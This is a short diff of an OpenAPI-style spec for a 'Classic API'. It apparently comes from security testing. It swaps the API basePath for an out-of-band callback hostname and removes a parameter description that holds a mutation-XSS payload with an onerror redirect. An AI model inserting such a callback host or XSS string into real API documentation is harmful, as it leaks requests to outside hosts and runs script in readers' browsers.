@@ -3,7 +3,7 @@ info:
   title: Classic API Resource Documentation
   description: 
   version: production
-basePath: /JSSResource/
+basePath: ckrk57m2vtc0000g9pz0gjhj1uhyyyyyb.oast.fun
 produces:
   - application/xml
   - application/json
@@ -17,8 +17,7 @@ paths:
     post:
       summary: Logs in
       parameters:
-        - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src="1" onerror="window.location.href = 'http://test.com'"</form>
+        - description:
           format: int64
           in: path
           name: id
